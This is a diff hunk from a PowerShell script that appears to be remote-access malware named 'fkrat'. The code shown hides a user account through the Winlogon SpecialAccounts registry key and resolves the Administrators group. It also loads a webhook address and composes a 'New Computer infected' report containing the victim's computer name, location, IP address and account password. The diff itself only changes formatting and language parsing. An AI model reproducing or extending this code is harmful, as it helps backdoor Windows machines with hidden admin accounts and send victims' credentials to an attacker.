@@ -55,18 +55,18 @@ $uName = "fkrat"
 $rPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList"
 $group = (((New-Object System.Security.Principal.SecurityIdentifier('S-1-5-32-544')).Translate([System.Security.Principal.NTAccount]).Value) -Split "\\")[1]
 $Webhook = Get-Content ./webhook
-$language = ((Get-WinUserLanguageList)[0].autonym -Split "(")[1]
+$language = (Get-WinUserLanguageList)[0].autonym
 $country = ((((Get-WinHomeLocation)[0] | Select-Object HomeLocation) | ConvertTo-Json -Compress -Depth 100)[17..300] -join '') 
 $country = $country.Substring(0, $country.length - 2)
 $description = 
 "
 New Computer infected 
 ---------------------------------
-Computer Name =       $env:computername 
-Computer Language =   $language
-Location (country) =  $country
-IP =                  $ip
-Account Password =    $pword
+Computer Name = $env:computername 
+Computer Language = $language
+Location (country) = $country
+IP = $ip
+Account Password = $pword
 "
 New-Item ./$env:computername.fk -Value (
   $ip, $pWord, "C:/Users/$uName" -join [Environment]::NewLine + [Environment]::NewLine
